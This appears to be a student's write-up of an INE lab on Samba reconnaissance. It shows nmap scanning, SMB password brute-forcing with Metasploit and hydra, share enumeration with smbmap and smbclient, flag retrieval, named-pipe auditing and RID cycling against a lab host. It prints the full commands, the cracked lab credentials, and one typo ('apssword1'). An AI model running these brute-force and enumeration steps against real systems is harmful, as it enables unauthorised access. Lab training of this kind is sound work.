## Samba Recon: Dictionary Attack

### Target
`demo.ine.local`

### Tools used:
* `nmap`
* `enumlinux`
* `smbmap`
* `hydra`

---
### Objective: Answer the following questions:

#### What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 05:34 IST
Nmap scan report for demo.ine.local (192.5.138.3)
Host is up (0.000025s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: RECONLABS)
MAC Address: 02:42:C0:05:8A:03 (Unknown)
Service Info: Host: SAMBA-RECON-BRUTE

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-01-24T00:04:56
|_  start_date: N/A
|_nbstat: NetBIOS name: SAMBA-RECON-BRU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: demo                                                                                                                                                                    
|   NetBIOS computer name: SAMBA-RECON-BRUTE\x00
|   Domain name: ine.local
|   FQDN: demo.ine.local
|_  System time: 2026-01-24T00:04:56+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds
```
```bash
msf6 auxiliary(scanner/smb/smb_login) > setg RHOSTs demo.ine.local
RHOSTs => demo.ine.local
msf6 auxiliary(scanner/smb/smb_login) > echo "Jane" > users.txt
[*] exec: echo "Jane" > users.txt

msf6 auxiliary(scanner/smb/smb_login) > cat users.txt
[*] exec: cat users.txt

Jane
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf6 auxiliary(scanner/smb/smb_login) > set Pass_fILE /usr/share/wordlists/metasploit/unix_passwords.txt
Pass_fILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set stop_on_success true 
stop_on_success => true
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.5.138.3:445       - 192.5.138.3:445 - Starting SMB login bruteforce
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:admin',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:123456',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:12345',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:123456789',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:password',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:iloveyou',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:princess',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:1234567',
[-] 192.5.138.3:445       - 192.5.138.3:445 - Failed: '.\Jane:12345678',
[+] 192.5.138.3:445       - 192.5.138.3:445 - Success: '.\Jane:abc123'
[*] demo.ine.local:445    - Scanned 1 of 1 hosts (100% complete)
[*] demo.ine.local:445    - Bruteforce completed, 1 credential was successful.
[*] demo.ine.local:445    - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
Ans: **abc123**

#### What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
```bash
┌──(root㉿INE)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://demo.ine.local
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-24 05:43:05
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-24 05:43:07
```
Ans: **apssword1**

#### Which share is read only? Use smbmap with credentials obtained in question 2.
```bash
┌──(root㉿INE)-[~]
└─# smbmap -H demo.ine.local -u admin -p password1

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 192.5.138.3:445 Name: demo.ine.local       Status: Authenticated
 Disk                                                   Permissions Comment
 ----                                                   ----------- -------
 shawn                                              READ, WRITE
 nancy                                              READ ONLY
 admin                                              READ, WRITE
 IPC$                                               NO ACCESS  IPC Service (brute.samba.recon.lab)
```
Ans: **nancy**

#### Is share “jane” browseable? Use credentials obtained from the 1st question.
```bash
┌──(root㉿INE)-[~]
└─# smbmap -H demo.ine.local -u jane -p abc123 -s jane

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                     
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                    
                                                     
[+] IP: 192.5.138.3:445 Name: demo.ine.local       Status: Authenticated
 Disk                                                   Permissions Comment
 ----                                                   ----------- -------
 shawn                                              NO ACCESS
 nancy                                              NO ACCESS
 admin                                              NO ACCESS
 IPC$                                               NO ACCESS  IPC Service (brute.samba.recon.lab)
```
```bash
┌──(root㉿INE)-[~]
└─# smbclient -L demo.ine.local -U jane                                                                                                                                                    
Password for [WORKGROUP\jane]:

 Sharename       Type      Comment
 ---------       ----      -------
 shawn           Disk      
 nancy           Disk      
 admin           Disk      
 IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

 Server               Comment
 ---------            -------

 Workgroup            Master
 ---------            -------
 RECONLABS  
```
```bash
┌──(root㉿INE)-[~]
└─# smbclient //demo.ine.local/jane -U jane                                                                                                                                             
Password for [WORKGROUP\jane]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  admin                               D        0  Wed Nov 28 00:55:12 2018
  flag                                D        0  Wed Nov 28 00:55:12 2018
  logs                                D        0  Wed Nov 28 00:55:12 2018

  1981311780 blocks of size 1024. 47734848 blocks available
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  flag                                N       33  Wed Nov 28 00:55:12 2018

  1981311780 blocks of size 1024. 47734756 blocks available
smb: \flag\> get flag
getting file \flag\flag of size 33 as flag (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
smb: \flag\> cd flag
cd \flag\flag\: NT_STATUS_NOT_A_DIRECTORY
smb: \flag\> exit
```
Ans: **yes**
#### Fetch the flag from share “admin”
```bash
┌──(root㉿INE)-[~]
└─# smbclient //demo.ine.local/admin -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 24 05:47:02 2026
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  hidden                              D        0  Wed Nov 28 00:55:12 2018

  1981311780 blocks of size 1024. 47734120 blocks available
smb: \> cd hidden\
smb: \hidden\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Sat Jan 24 05:47:02 2026
  flag.tar.gz                         N      151  Wed Nov 28 00:55:12 2018

  1981311780 blocks of size 1024. 47734120 blocks available
smb: \hidden\> get flag.tar.gz 
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> exit

┌──(root㉿INE)-[~]
└─# gzip -d flag                                                                                                                                                                           
flag         flag.tar.gz  
┌──(root㉿INE)-[~]
└─# gzip -d flag                                                                                                                                                                           
flag         flag.tar.gz  
┌──(root㉿INE)-[~]
└─# gzip -d flag.tar.gz                                                                                                                                                                    

┌──(root㉿INE)-[~]
└─# ls                                                                                                                                                                                     
Desktop  Documents  Downloads  flag  flag.tar  Music  Pictures  Public  Templates  thinclient_drives  users.txt  Videos

┌──(root㉿INE)-[~]
└─# rm flag                                                                                                                                                                                

┌──(root㉿INE)-[~]
└─# gzip -d flag.tar                                                                                                                                                                       
gzip: flag.tar: unknown suffix -- ignored

┌──(root㉿INE)-[~]
└─# tar -xvf flag.tar
flag

┌──(root㉿INE)-[~]
└─# ls                                                                                                                                                                                     
Desktop  Documents  Downloads  flag  flag.tar  Music  Pictures  Public  Templates  thinclient_drives  users.txt  Videos

┌──(root㉿INE)-[~]
└─# cat flag                                                                                                                                                                               
2727069bc058053bd561ce372721c92e
```
Ans: **2727069bc058053bd561ce372721c92e**

#### List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.
```bash
msf6 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/smb/pipe_auditor) > set SMBUSER admin
SMBUSER => admin
msf6 auxiliary(scanner/smb/pipe_auditor) > set SMBPASS password1
SMBPASS => password1
msf6 auxiliary(scanner/smb/pipe_auditor) > run

[+] 192.5.138.3:139 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] demo.ine.local: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/pipe_auditor) > 
```
Ans: **netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc**

#### List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.
```bash
S-1-22-1-1000 Unix User\shawn (Local User)                                                                                                                                                 
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
```
---